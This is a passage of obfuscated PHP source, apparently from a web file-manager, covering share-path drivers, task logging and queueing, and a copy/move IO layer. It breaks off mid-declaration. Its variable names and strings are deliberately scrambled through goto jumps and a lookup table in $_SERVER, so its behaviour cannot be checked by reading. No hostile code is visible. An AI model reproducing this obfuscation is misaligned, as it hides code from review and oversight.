<?php
 goto f¯š©ó‰ÁŠ; FäÏ´ƒ…: class PathDriverDriverShareItem { public function __construct($êàãäõµ) { $this->pathParse = $êàãäõµ; } public function __call($€ÊŒ©İş, $ø’Ó•˜†) { $€ŠÏœÊñ =& $_SERVER[Å¶¨Şêº]; if (method_exists($this, $€ÊŒ©İş)) { return; } $é¢µé…ë = call_user_func_array(array($€ŠÏœÊñ[1347], $€ÊŒ©İş), $ø’Ó•˜†); $´œ·ßËÃ = array($€ŠÏœÊñ[1348], $€ŠÏœÊñ[1349], $€ŠÏœÊñ[1350], $€ŠÏœÊñ[1351], $€ŠÏœÊñ[555], $€ŠÏœÊñ[557], $€ŠÏœÊñ[1352], $€ŠÏœÊñ[118], $€ŠÏœÊñ[1353], $€ŠÏœÊñ[1354]); if (in_array($€ÊŒ©İş, $´œ·ßËÃ)) { $é¢µé…ë = $this->getPathOuter($é¢µé…ë); } return $é¢µé…ë; } public function copy($ï‡¦ã¿, $‹ÚĞ‚ğ¤, $ãË·•ö§ = false, $ÕìúÅà… = false) { return $this->copyMove($ï‡¦ã¿, $‹ÚĞ‚ğ¤, $ãË·•ö§, $_SERVER[Å¶¨Şêº][555], $ÕìúÅà…); } public function move($¦º„àÁà, $òúö¾íÉ, $§ü•¸Üâ = false, $ÙÄıµ©ş = false) { return $this->copyMove($¦º„àÁà, $òúö¾íÉ, $§ü•¸Üâ, $_SERVER[Å¶¨Şêº][557], $ÙÄıµ©ş); } private function copyMove($¢–íÆ, $ÖÍâ±™, $Î¹‘µúå, $†å¬ÆÚŞ, $¾øò«ú‚ = false) { $‚ã½—‡… =& $_SERVER[Å¶¨Şêº]; $÷ÃÀ¼©Ÿ = $ÖÍâ±™; $µ”ú‹äÚ = IO::driverMake($ÖÍâ±™); if ($µ”ú‹äÚ->pathParse[$‚ã½—‡…[1148]]) { $ÖÍâ±™ = $µ”ú‹äÚ->pathParse[$‚ã½—‡…[1148]]; } else { $ÖÍâ±™ = $÷ÃÀ¼©Ÿ; } $ñ©¹¢ıŒ = IO::copyMove($¢–íÆ, $ÖÍâ±™, $Î¹‘µúå, $†å¬ÆÚŞ, $¾øò«ú‚); $ñ©¹¢ıŒ = $this->getPathOuter($ñ©¹¢ıŒ); return $ñ©¹¢ıŒ; } public function pathThis($Üš´ÂÆ¿) { return get_path_this($this->pathParse[$_SERVER[Å¶¨Şêº][95]]); } public function pathFather($ÎúĞ½ò´) { return get_path_father($this->pathParse[$_SERVER[Å¶¨Şêº][95]]); } public function iconvSystem($«Á˜øñÙ) { return $«Á˜øñÙ; } protected function infoParse($·ÕîâÜ›, $“¨± æœ = false) { $¦«ÓùõÔ =& $_SERVER[Å¶¨Şêº]; $Ç¯×›Ô® = $this->pathParse[$¦«ÓùõÔ[495]][$¦«ÓùõÔ[1172]] . $this->pathParse[$¦«ÓùõÔ[1165]]; if ($“¨± æœ) { $¸èêÃÏÒ = IO::infoWithChildren($Ç¯×›Ô®); } else { $¸èêÃÏÒ = IO::info($Ç¯×›Ô®); } $Å‚šÔâœ = $this->pathParse[$¦«ÓùõÔ[495]]; return Action($¦«ÓùõÔ[1345])->_shareItemeParse($¸èêÃÏÒ, $Å‚šÔâœ); } public function listAll($íÓÏÉ˜«) { $ÆèÔ§Áˆ =& $_SERVER[Å¶¨Şêº]; $ç½ÍÛµ = IO::listAll($íÓÏÉ˜«); $ÚÖşĞı = rtrim($this->pathParse[$ÆèÔ§Áˆ[495]][$ÆèÔ§Áˆ[1172]], $ÆèÔ§Áˆ[8]); foreach ($ç½ÍÛµ as &$ÃÉñÖ¦œ) { $ÃÉñÖ¦œ[$ÆèÔ§Áˆ[95]] = $this->pathDriver . $ÆèÔ§Áˆ[8] . ltrim(substr($ÃÉñÖ¦œ[$ÆèÔ§Áˆ[95]], strlen($ÚÖşĞı)), $ÆèÔ§Áˆ[8]); } unset($ÃÉñÖ¦œ); return $ç½ÍÛµ; } public function listAllSimple($Ù£ª, $“ÇÔ³Š× = false) { $æò¯œê³ =& $_SERVER[Å¶¨Şêº]; $â¾¿‰Ú´ = $this->listAll($Ù£ª); $Æ°øæ¿ê = $this->pathParse[$æò¯œê³[430]]; if (trim($Æ°øæ¿ê, $æò¯œê³[8]) == trim(get_path_father($Æ°øæ¿ê), $æò¯œê³[8])) { $“ÇÔ³Š× = !0; } return IO::init($æò¯œê³[12])->listAllSimpleMake($â¾¿‰Ú´, $Æ°øæ¿ê, $“ÇÔ³Š×); } public function getPathOuter($‘ˆèÅ) { $•µ»™¡Ê =& $_SERVER[Å¶¨Şêº]; $†€’‡² = KodIO::parse($‘ˆèÅ); if ($†€’‡²[$•µ»™¡Ê[43]] == KodIO::KOD_SHARE_ITEM) { return $†€’‡²[$•µ»™¡Ê[95]]; } $ ÏÑÕÉ = KodIO::clear($‘ˆèÅ); $…¾º‰—­ = KodIO::clear($this->pathParse[$•µ»™¡Ê[495]][$•µ»™¡Ê[1172]]); $ö”…ı = substr($ ÏÑÕÉ, strlen($…¾º‰—­)); if (substr($ ÏÑÕÉ, 0, strlen($…¾º‰—­)) != $…¾º‰—­) { return !1; } return $this->pathParse[$•µ»™¡Ê[1166]] . $•µ»™¡Ê[8] . ltrim($ö”…ı, $•µ»™¡Ê[8]); } public function getType() { $…Şš ¬Ë =& $_SERVER[Å¶¨Şêº]; $ó€·°À = str_replace($…Şš ¬Ë[85], $…Şš ¬Ë[12], get_class($this)); return strtolower($ó€·°À); } public function isTypeObject($ßÒªäë) { return IO::isTypeObject($ßÒªäë); } public function info($°öùı‘) { return $this->infoParse($°öùı‘); } public function infoAuth($åÃß–éğ) { return $this->infoParse($åÃß–éğ); } public function infoWithChildren($Ù«ğÈØÛ) { return $this->infoParse($Ù«ğÈØÛ, !0); } public function infoFull($åñ˜€·À) { return $this->infoParse($åñ˜€·À); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Æäç„”ª) { $this->pathParse = $Æäç„”ª; } protected function infoParse($Ü”ã®, $ğğ…é»˜ = false) { $‚ö‡†ê =& $_SERVER[Å¶¨Şêº]; return Action($‚ö‡†ê[1171])->sharePathInfo($this->pathParse[$‚ö‡†ê[95]], !0, $ğğ…é»˜); } public function listPath($ÎúªÕÒÔ, $Şˆ…Ó…å = false) { $Ç‚ô¡‘ =& $_SERVER[Å¶¨Şêº]; $¥ãÍ¹—ö = IO::listPath($ÎúªÕÒÔ, $Şˆ…Ó…å); if (!$¥ãÍ¹—ö) { return $¥ãÍ¹—ö; } if (is_array($¥ãÍ¹—ö[$Ç‚ô¡‘[1346]])) { $ş»øÂ°¨ = Action($Ç‚ô¡‘[1355])->parsePathChildren($¥ãÍ¹—ö[$Ç‚ô¡‘[1346]], array($Ç‚ô¡‘[430] => $ÎúªÕÒÔ)); $¥ãÍ¹—ö[$Ç‚ô¡‘[1346]] = Action($Ç‚ô¡‘[1171])->shareItemInfo($ş»øÂ°¨); } foreach ($¥ãÍ¹—ö as $õÎõ¢† => $­‡ªÍø) { if (!in_array($õÎõ¢†, array($Ç‚ô¡‘[94], $Ç‚ô¡‘[93]))) { continue; } foreach ($­‡ªÍø as $“¾±°¬Ÿ => $ş»øÂ°¨) { $ş»øÂ°¨ = Action($Ç‚ô¡‘[1355])->parsePathChildren($ş»øÂ°¨, array($Ç‚ô¡‘[430] => $ÎúªÕÒÔ)); $¥ãÍ¹—ö[$õÎõ¢†][$“¾±°¬Ÿ] = Action($Ç‚ô¡‘[1171])->shareItemInfo($ş»øÂ°¨); } } return $¥ãÍ¹—ö; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($¿Ó¢ÊÒ) { parent::__construct($¿Ó¢ÊÒ); } } goto aª–Şˆ¿†™; A„ŒÉ‘°„: class TaskHttp extends Task { protected function startAfter() { $‰ãÒ…ª¯ =& $_SERVER[Å¶¨Şêº]; $¥Çˆ÷‡ =& $this->task; $¥Çˆ÷‡[$‰ãÒ…ª¯[1740]] = 1; Hook::bind($‰ãÒ…ª¯[1708], array($this, $‰ãÒ…ª¯[1741])); Hook::bind($‰ãÒ…ª¯[1710], array($this, $‰ãÒ…ª¯[1742])); Hook::bind($‰ãÒ…ª¯[1712], array($this, $‰ãÒ…ª¯[1743])); } protected function endAfter() { $´³ÓØ„Ô =& $_SERVER[Å¶¨Şêº]; Hook::unbind($´³ÓØ„Ô[1708], array($this, $´³ÓØ„Ô[1741])); Hook::unbind($´³ÓØ„Ô[1710], array($this, $´³ÓØ„Ô[1742])); Hook::unbind($´³ÓØ„Ô[1712], array($this, $´³ÓØ„Ô[1743])); } public function progressStart($¸§ã­ò) { $æ–ê¦Îö =& $_SERVER[Å¶¨Şêº]; $›ª€é€Ş = curl_getinfo($¸§ã­ò); self::log($æ–ê¦Îö[1744] . $›ª€é€Ş[$æ–ê¦Îö[317]]); self::valueSet($this->task[$æ–ê¦Îö[408]], $this->task); } public function progressEnd($ãÈ«ãà„) { $‰ ÒÑ…Û =& $_SERVER[Å¶¨Şêº]; self::log($‰ ÒÑ…Û[1745] . $this->task[$‰ ÒÑ…Û[408]]); $this->end(); } public function progress($Îûì®Û, $Ú”˜„ì», $‡˜©™ÍĞ, $ø±¨°Š, $ÒœÄìØø) { $»÷ŒëáÀ =& $_SERVER[Å¶¨Şêº]; $ğì›¬ø× =& $this->task; if ($ÒœÄìØø > 0) { $ğì›¬ø×[$»÷ŒëáÀ[784]] = $ğì›¬ø×[$»÷ŒëáÀ[784]] == 0 ? $ø±¨°Š : $ğì›¬ø×[$»÷ŒëáÀ[784]]; $ğì›¬ø×[$»÷ŒëáÀ[1664]] = $ÒœÄìØø; } else { if ($‡˜©™ÍĞ > 0) { $ğì›¬ø×[$»÷ŒëáÀ[784]] = $ğì›¬ø×[$»÷ŒëáÀ[784]] == 0 ? $Ú”˜„ì» : $ğì›¬ø×[$»÷ŒëáÀ[784]]; $ğì›¬ø×[$»÷ŒëáÀ[1664]] = $‡˜©™ÍĞ; } } $this->update(); self::log("\x70\x72\x6f\147\x72\145\163\163\x48\x74\164\160\72\x64\157\167\x6e\72{$‡˜©™ÍĞ}\x2f{$Ú”˜„ì»}\x3b\x20\165\160\x6c\x6f\141\x64\72{$ÒœÄìØø}\57{$ø±¨°Š}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ŸÈëŠ”, $˜…¦ æÎ = '', $Î››·—â = 0, $É„âÏÈÒ = '') { $îâé«‡Ë =& $_SERVER[Å¶¨Şêº]; $ı½…êå¡ = new Task($ŸÈëŠ”, $˜…¦ æÎ, $Î››·—â, $É„âÏÈÒ); $GLOBALS[$îâé«‡Ë[1746] . $ŸÈëŠ”] = new TaskLog($îâé«‡Ë[1647], $ı½…êå¡, $É„âÏÈÒ); return $ı½…êå¡; } public function __construct($¥¯¬ŒÒë = '', $Ê·Û€­’ = '', $È»ëíÇŒ = '') { $ŒÉ€Ì› =& $_SERVER[Å¶¨Şêº]; if (!$¥¯¬ŒÒë) { $¥¯¬ŒÒë = $ŒÉ€Ì›[1647]; } $î‚ş£Öá = $¥¯¬ŒÒë . $ŒÉ€Ì›[395] . rand_string(10); if (!$È»ëíÇŒ) { $È»ëíÇŒ = $¥¯¬ŒÒë . $ŒÉ€Ì›[63] . $È»ëíÇŒ; } switch ($¥¯¬ŒÒë) { case $ŒÉ€Ì›[1647]: if (!$Ê·Û€­’ || !$Ê·Û€­’->task) { return echoLog($¥¯¬ŒÒë . $ŒÉ€Ì›[1747]); } $À“«ó“¤ = $Ê·Û€­’; $î‚ş£Öá = $À“«ó“¤->task[$ŒÉ€Ì›[408]]; $¥¯¬ŒÒë = $À“«ó“¤->task[$ŒÉ€Ì›[408]]; if (!$À“«ó“¤->task[$ŒÉ€Ì›[1563]]) { $À“«ó“¤->task[$ŒÉ€Ì›[1563]] = $È»ëíÇŒ ? $È»ëíÇŒ : $¥¯¬ŒÒë; } break; case $ŒÉ€Ì›[1748]: if (!$Ê·Û€­’) { return echoLog($¥¯¬ŒÒë . $ŒÉ€Ì›[1749]); } $­Ğœ±«˜ = is_string($Ê·Û€­’) ? array($Ê·Û€­’) : $Ê·Û€­’; $À“«ó“¤ = new TaskFileTransfer($î‚ş£Öá, $¥¯¬ŒÒë, 0, $È»ëíÇŒ ? $È»ëíÇŒ : $­Ğœ±«˜[0]); foreach ($­Ğœ±«˜ as $™Üõ¿) { $À“«ó“¤->addPath($™Üõ¿); } break; case $ŒÉ€Ì›[323]: if (!$Ê·Û€­’) { return echoLog($¥¯¬ŒÒë . $ŒÉ€Ì›[1749]); } $­Ğœ±«˜ = is_string($Ê·Û€­’) ? array($Ê·Û€­’) : $Ê·Û€­’; $À“«ó“¤ = new TaskZip($î‚ş£Öá, $¥¯¬ŒÒë, 0, $È»ëíÇŒ ? $È»ëíÇŒ : $­Ğœ±«˜[0]); foreach ($­Ğœ±«˜ as $™Üõ¿) { $À“«ó“¤->addPath($™Üõ¿); } break; case $ŒÉ€Ì›[1212]: if (!$Ê·Û€­’) { return echoLog($¥¯¬ŒÒë . $ŒÉ€Ì›[1749]); } $À“«ó“¤ = new TaskUnZip($î‚ş£Öá, $¥¯¬ŒÒë, 0, $È»ëíÇŒ ? $È»ëíÇŒ : $Ê·Û€­’); if ($Ê·Û€­’) { $À“«ó“¤->addFile($Ê·Û€­’); } break; case $ŒÉ€Ì›[159]: $À“«ó“¤ = new TaskHttp($î‚ş£Öá, $¥¯¬ŒÒë); break; default: return; break; } $this->task = $À“«ó“¤; $this->taskID = $î‚ş£Öá; Hook::bind($ŒÉ€Ì›[1684], array($this, $ŒÉ€Ì›[1750])); Hook::bind($ŒÉ€Ì›[1686], array($this, $ŒÉ€Ì›[1751])); Hook::bind($ŒÉ€Ì›[1680], array($this, $ŒÉ€Ì›[1752])); echoLog($ŒÉ€Ì›[1753] . $À“«ó“¤->task[$ŒÉ€Ì›[1563]]); } public function __destruct() { $this->end(); } public function end($¡½÷¹ = '') { $ùÈ°ÂÎË =& $_SERVER[Å¶¨Şêº]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($¡½÷¹); $this->task = !1; $this->taskID = !1; Hook::unbind($ùÈ°ÂÎË[1684], array($this, $ùÈ°ÂÎË[1750])); Hook::unbind($ùÈ°ÂÎË[1686], array($this, $ùÈ°ÂÎË[1751])); Hook::unbind($ùÈ°ÂÎË[1680], array($this, $ùÈ°ÂÎË[1752])); } public function taskUpdate($½ºÓÔü÷) { $ƒœİÕµø =& $_SERVER[Å¶¨Şêº]; if (!$½ºÓÔü÷ || $this->taskID != $½ºÓÔü÷[$ƒœİÕµø[408]]) { return; } $ö“•Šõ´ = 20; $ÏÚ€‘õ = intval($½ºÓÔü÷[$ƒœİÕµø[1665]] * $ö“•Šõ´); $ûÓ¸ ü¤ = $ƒœİÕµø[173] . str_repeat($ƒœİÕµø[881], $ÏÚ€‘õ) . $ƒœİÕµø[1011] . str_repeat($ƒœİÕµø[63], $ö“•Šõ´ - $ÏÚ€‘õ) . $ƒœİÕµø[175]; $Ñ¥Û°£î = $ûÓ¸ ü¤ . sprintf($ƒœİÕµø[1754], $½ºÓÔü÷[$ƒœİÕµø[1665]] * 100) . $ƒœİÕµø[1755]; $‚³Üğ× = $Ñ¥Û°£î . $½ºÓÔü÷[$ƒœİÕµø[1664]] . $ƒœİÕµø[8] . $½ºÓÔü÷[$ƒœİÕµø[784]] . LNG($ƒœİÕµø[1756]); $µşÀåï¨ = $ƒœİÕµø[12]; if ($½ºÓÔü÷[$ƒœİÕµø[1740]]) { $‚³Üğ× = $Ñ¥Û°£î . size_format($½ºÓÔü÷[$ƒœİÕµø[1664]]) . $ƒœİÕµø[8] . size_format($½ºÓÔü÷[$ƒœİÕµø[784]]); $µşÀåï¨ = size_format($½ºÓÔü÷[$ƒœİÕµø[1666]]) . $ƒœİÕµø[1757]; } if ($½ºÓÔü÷[$ƒœİÕµø[1061]]) { $½ºÓÔü÷[$ƒœİÕµø[1714]] = $½ºÓÔü÷[$ƒœİÕµø[1061]] . $ƒœİÕµø[63] . $½ºÓÔü÷[$ƒœİÕµø[1714]]; } if ($½ºÓÔü÷[$ƒœİÕµø[1714]]) { $ùË…Ú½Ì = $ƒœİÕµø[12]; if ($½ºÓÔü÷[$ƒœİÕµø[1716]]) { $ùË…Ú½Ì = $ƒœİÕµø[60] . size_format($½ºÓÔü÷[$ƒœİÕµø[1717]]) . $ƒœİÕµø[8] . size_format($½ºÓÔü÷[$ƒœİÕµø[1716]]); } $µşÀåï¨ .= $½ºÓÔü÷[$ƒœİÕµø[1714]] . $ùË…Ú½Ì; } if ($½ºÓÔü÷[$ƒœİÕµø[761]] && !$½ºÓÔü÷[$ƒœİÕµø[1716]]) { $µşÀåï¨ .= $ƒœİÕµø[63] . size_format($½ºÓÔü÷[$ƒœİÕµø[1721]]) . $ƒœİÕµø[8] . size_format($½ºÓÔü÷[$ƒœİÕµø[761]]); } echoLog($‚³Üğ× . $ƒœİÕµø[63] . $µşÀåï¨, !0); } public function taskEnd($ÅŞëô²ú) { $àĞƒò£æ =& $_SERVER[Å¶¨Şêº]; if (!$ÅŞëô²ú || $this->taskID != $ÅŞëô²ú[$àĞƒò£æ[408]]) { return; } $ÛÊò§±Ï = $ÅŞëô²ú ? $ÅŞëô²ú[$àĞƒò£æ[1664]] . $àĞƒò£æ[8] . $ÅŞëô²ú[$àĞƒò£æ[784]] . LNG($àĞƒò£æ[1756]) . $àĞƒò£æ[82] : $àĞƒò£æ[12]; echoLog($àĞƒò£æ[1758] . $ÅŞëô²ú[$àĞƒò£æ[1563]] . ($ÅŞëô²ú[$àĞƒò£æ[462]] ? $àĞƒò£æ[82] . $ÅŞëô²ú[$àĞƒò£æ[462]] : $àĞƒò£æ[12]) . $àĞƒò£æ[82] . $ÛÊò§±Ï . $àĞƒò£æ[1759] . sprintf($àĞƒò£æ[848], timeFloat() - $ÅŞëô²ú[$àĞƒò£æ[1667]]) . $àĞƒò£æ[1679]); $this->end(); } public function taskKill($Ïå²åîÓ) { $òğÃ¢û¯ =& $_SERVER[Å¶¨Şêº]; if (!$Ïå²åîÓ || $this->taskID != $Ïå²åîÓ[$òğÃ¢û¯[408]]) { return; } echoLog($òğÃ¢û¯[1760] . $Ïå²åîÓ[$òğÃ¢û¯[1563]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\153\x51\165\145\165\x65\x4c\x65\x6e\x67\x74\150"; const QUEUE_DATA = "\x74\x61\x73\x6b\x51\165\145\x75\x65\x44\x61\x74\141"; public static $listData = false; public static function initTask() { } public static function add($ôÀ¿õÃ, $›ë´ò©İ = array(), $ŠÂá¾æ¬ = '', $ö˜¿Éü = '') { $ıæ¨©­ =& $_SERVER[Å¶¨Şêº]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ö˜¿Éü && array_find_by_field(self::$listData, $ıæ¨©­[105], $ö˜¿Éü)) { return !0; } self::$listData[] = array($ıæ¨©­[274] => $ôÀ¿õÃ, $ıæ¨©­[1761] => $›ë´ò©İ, $ıæ¨©­[462] => $ŠÂá¾æ¬, $ıæ¨©­[105] => $ö˜¿Éü); return !0; } public static function addSubmit() { $ˆÒ¹Ùƒş =& $_SERVER[Å¶¨Şêº]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($ˆÒ¹Ùƒş[1762] . json_encode_force(array_to_keyvalue(self::$listData, $ˆÒ¹Ùƒş[12], $ˆÒ¹Ùƒş[462])), $ˆÒ¹Ùƒş[1763]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($Æ‹¥šåï, $Ú–úÏİä = array(), $‹­¬ÊÍ‹ = '', $Ö¦Û¢ìí = '') { $óóûíà =& $_SERVER[Å¶¨Şêº]; if (self::count() >= self::MAX_LENGTH) { return !1; } $¨Šè§˜‡ = self::getAll(); if ($Ö¦Û¢ìí && array_find_by_field($¨Šè§˜‡, $óóûíà[105], $Ö¦Û¢ìí)) { return !0; } $¨Šè§˜‡[] = array($óóûíà[274] => $Æ‹¥šåï, $óóûíà[1761] => $Ú–úÏİä, $óóûíà[462] => $‹­¬ÊÍ‹, $óóûíà[105] => $Ö¦Û¢ìí); write_log($óóûíà[1762] . $‹­¬ÊÍ‹, $óóûíà[1763]); self::setAll($¨Šè§˜‡); return !0; } public static function run() { $İ±ò´ã =& $_SERVER[Å¶¨Şêº]; $úÁÜİßƒ = self::getAll(); $ÄÚÈ®¦õ = array_shift($úÁÜİßƒ); if (!$ÄÚÈ®¦õ) { return !1; } self::setAll($úÁÜİßƒ); $ˆà¦Ø» = timeFloat(); try { Hook::apply($ÄÚÈ®¦õ[$İ±ò´ã[274]], $ÄÚÈ®¦õ[$İ±ò´ã[1761]]); } catch (Exception $ÈŞ³Ñ’) { } $‚ıè‹È€ = number_format(timeFloat() - $ˆà¦Ø», 3) . $İ±ò´ã[1679]; write_log($İ±ò´ã[1764] . $ÄÚÈ®¦õ[$İ±ò´ã[462]] . $İ±ò´ã[1765] . $‚ıè‹È€, $İ±ò´ã[1763]); return !0; } public static function count() { $²¿ù›é = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$²¿ù›é) { return 0; } return intval($²¿ù›é); } public static function getAll() { $‹ø…ÂÃ¥ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$‹ø…ÂÃ¥) { return array(); } return $‹ø…ÂÃ¥; } public static function setAll($À¼´Ÿ‰œ) { $Ãá®Ñ”É = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($À¼´Ÿ‰œ), $Ãá®Ñ”É); Cache::set(self::QUEUE_DATA, $À¼´Ÿ‰œ, $Ãá®Ñ”É); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto EŞô¨‹‘”º; BµšŠ†®Æ: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ñ¸üìì, $…Ö”æÕú) { $±¬ı«ëƒ =& $_SERVER[Å¶¨Şêº]; $ù×©èáŞ = $…Ö”æÕú; $GLOBALS[$±¬ı«ëƒ[1143]] = $±¬ı«ëƒ[1144] . $ñ¸üìì; Hook::trigger($±¬ı«ëƒ[1144] . $ñ¸üìì . $±¬ı«ëƒ[1145], $ù×©èáŞ); $ıŞ‚İñÛ = self::driverMake($…Ö”æÕú[0]); if (!$ıŞ‚İñÛ) { return !1; } if (method_exists($ıŞ‚İñÛ, $ñ¸üìì)) { $°‰€İÖ™ = @call_user_func_array(array($ıŞ‚İñÛ, $ñ¸üìì), $…Ö”æÕú); } else { if (method_exists($ıŞ‚İñÛ, $±¬ı«ëƒ[1146])) { $°‰€İÖ™ = @call_user_func_array(array($ıŞ‚İñÛ, $ñ¸üìì), $…Ö”æÕú); } else { if (method_exists(self, $ñ¸üìì)) { $°‰€İÖ™ = @call_user_func_array(array(self, $ñ¸üìì), $…Ö”æÕú); } else { $°‰€İÖ™ = call_user_func_array(array(parent, $ñ¸üìì), $…Ö”æÕú); } } } Hook::trigger($±¬ı«ëƒ[1144] . $ñ¸üìì . $±¬ı«ëƒ[1147], $ù×©èáŞ, $°‰€İÖ™); return $°‰€İÖ™; } public static function init($½£ÖÎŸ) { return self::driverMake($½£ÖÎŸ); } public static function copy($ğÖŸ„², $µãç¬¸ˆ, $¹¶œÙï¯ = false, $œÇ×şß = false) { return self::copyMoveStart($ğÖŸ„², $µãç¬¸ˆ, $¹¶œÙï¯, $_SERVER[Å¶¨Şêº][555], $œÇ×şß); } public static function move($ó²­ã‚¶, $ı¼ïÚ¹¦, $ƒïÀ¾ÁÆ = false, $ÏÍ•–ƒû = false) { return self::copyMoveStart($ó²­ã‚¶, $ı¼ïÚ¹¦, $ƒïÀ¾ÁÆ, $_SERVER[Å¶¨Şêº][557], $ÏÍ•–ƒû); } private static function copyMoveStart($æï½¹, $¡•õé¸¼, $ºÍè ¶ß, $Ø‰¿Ìã, $Ì¶€æë) { $¤ÏáåŸ =& $_SERVER[Å¶¨Şêº]; $œ¦ì¹‹“ = array($æï½¹, $¡•õé¸¼, $ºÍè ¶ß, $Ì¶€æë); Hook::trigger($¤ÏáåŸ[1144] . $Ø‰¿Ìã . $¤ÏáåŸ[1145], $œ¦ì¹‹“); $î¢Æ–Ÿ¢ = self::copyMove($æï½¹, $¡•õé¸¼, $ºÍè ¶ß, $Ø‰¿Ìã, $Ì¶€æë); Hook::trigger($¤ÏáåŸ[1144] . $Ø‰¿Ìã . $¤ÏáåŸ[1147], $œ¦ì¹‹“, $î¢Æ–Ÿ¢); return $î¢Æ–Ÿ¢; } public static function saveFile($Ğïª¡°Ò, $¤‰‰¼È£, $ü”‰å•ö = true) { $„²°Ëî =& $_SERVER[Å¶¨Şêº]; $ÖÈÏˆ½ = self::info($¤‰‰¼È£); $â°ÖÆø = self::driverMake($Ğïª¡°Ò); $ö¥ğ™Ì = self::driverMake($¤‰‰¼È£); $«àíÚ‡Š = !1; if ($ö¥ğ™Ì->pathParse[$„²°Ëî[1148]]) { $«àíÚ‡Š = $ö¥ğ™Ì; $éÄıàÊ = $ö¥ğ™Ì->pathParse[$„²°Ëî[1148]]; $ö¥ğ™Ì = self::driverMake($éÄıàÊ); } if ($â°ÖÆø->pathParse[$„²°Ëî[1148]]) { $¬É²±‘ = $â°ÖÆø->pathParse[$„²°Ëî[1148]]; $â°ÖÆø = self::driverMake($¬É²±‘); } $„©åñ¬– = $ö¥ğ™Ì->pathFather($¤‰‰¼È£); $×úÔªÃá = !0; if (!$ü”‰å•ö && self::driverIsSame($â°ÖÆø, $ö¥ğ™Ì)) { $×úÔªÃá = !1; } $ôÒ¶È£´ = self::copyFile($â°ÖÆø, $Ğïª¡°Ò, $ö¥ğ™Ì, $„©åñ¬–, $ÖÈÏˆ½[$„²°Ëî[42]], $×úÔªÃá); if ($«àíÚ‡Š) { $ôÒ¶È£´ = $«àíÚ‡Š->getPathOuter($ôÒ¶È£´); } return $ôÒ¶È£´; } private static function copyMove($×¸šË¥, $‰ï¶«©¹, $À–ùøâò, $Ñú²â, $¢±ßµÏ¶ = false) { $İ¥©ï³ =& $_SERVER[Å¶¨Şêº]; if (!$×¸šË¥ || $×¸šË¥ == $İ¥©ï³[8] || !$‰ï¶«©¹) { return !1; } ignore_timeout(); $ÎóÛÎÒß = self::driverMake($×¸šË¥); $¨ Ä„•º = self::driverMake($‰ï¶«©¹); $éÑà©©Ğ = $Ñú²â == $İ¥©ï³[557]; $”òš ¼ñ = !1; if ($¨ Ä„•º->pathParse[$İ¥©ï³[1148]]) { $”òš ¼ñ = $¨ Ä„•º; $‰ï¶«©¹ = $¨ Ä„•º->pathParse[$İ¥©ï³[1148]]; $¨ Ä„•º = self::driverMake($‰ï¶«©¹); } if ($ÎóÛÎÒß->pathParse[$İ¥©ï³[1148]]) { $×¸šË¥ = $ÎóÛÎÒß->pathParse[$İ¥©ï³[1148]]; $ÎóÛÎÒß = self::driverMake($×¸šË¥); } self::check($ÎóÛÎÒß, $×¸šË¥, $¨ Ä„•º, $‰ï¶«©¹); Hook::trigger($İ¥©ï³[1149], $ÎóÛÎÒß, $×¸šË¥, $¨ Ä„•º, $‰ï¶«©¹); $éˆÄ›è® = self::driverIsSame($ÎóÛÎÒß, $¨ Ä„•º); if ($éˆÄ›è®) { if ($Ñú²â == $İ¥©ï³[557] && !method_exists($¨ Ä„•º, $İ¥©ï³[1150]) && trim($‰ï¶«©¹, $İ¥©ï³[8]) == trim($¨ Ä„•º->pathFather($×¸šË¥), $İ¥©ï³[8])) { if ($ÎóÛÎÒß->pathThis($×¸šË¥) != $¢±ßµÏ¶ && !$ÎóÛÎÒß->isTypeObject()) { return $ÎóÛÎÒß->rename($×¸šË¥, $¢±ßµÏ¶); } return $¨ Ä„•º->getPathOuter($×¸šË¥); } if (method_exists($¨ Ä„•º, $Ñú²â)) { return $¨ Ä„•º->{$Ñú²â}($×¸šË¥, $‰ï¶«©¹, $À–ùøâò, $¢±ßµÏ¶); } } if ($éˆÄ›è® && $Ñú²â == $İ¥©ï³[557] && $¨ Ä„•º->getType() == $İ¥©ï³[117]) { $óüıò” = $¨ Ä„•º->movePath($×¸šË¥, $‰ï¶«©¹, $¢±ßµÏ¶); if ($óüıò”) { return $óüıò”; } } $£–úëÁ = $ÎóÛÎÒß->isFile($×¸šË¥); if (!$£–úëÁ && $¨ Ä„•º->getType() == $İ¥©ï³[755] && $ÎóÛÎÒß->getType() == $İ¥©ï³[117]) { $óüıò” = $¨ Ä„•º->copyFolderFromIO($ÎóÛÎÒß, $×¸šË¥, $‰ï¶«©¹, $À–ùøâò, $éÑà©©Ğ, $¢±ßµÏ¶); } else { $óüıò” = self::copyPath($ÎóÛÎÒß, $×¸šË¥, $¨ Ä„•º, $‰ï¶«©¹, $À–ùøâò, $éÑà©©Ğ, $£–úëÁ, $¢±ßµÏ¶); } if ($óüıò” && $éÑà©©Ğ) { $ÎóÛÎÒß->remove($×¸šË¥); } if ($”òš ¼ñ) { $óüıò” = $”òš ¼ñ->getPathOuter($óüıò”); } return $óüıò”; } private static function check($í«·¦öœ, $”…ôæªé, $ñ‚ôê‚›, &$ŠÅ²­••) { $š‘åœ»Ø =& $_SERVER[Å¶¨Şêº]; if (self::driverIsSame($í«·¦öœ, $ñ‚ôê‚›) && $í«·¦öœ->isFolder($”…ôæªé) && $í«·¦öœ->isParentOf($”…ôæªé, $ŠÅ²­••)) { show_json(LNG($š‘åœ»Ø[1151]), !1); } if (!$í«·¦öœ->exist($”…ôæªé)) { show_json(LNG($š‘åœ»Ø[116]), !1); } } private static function 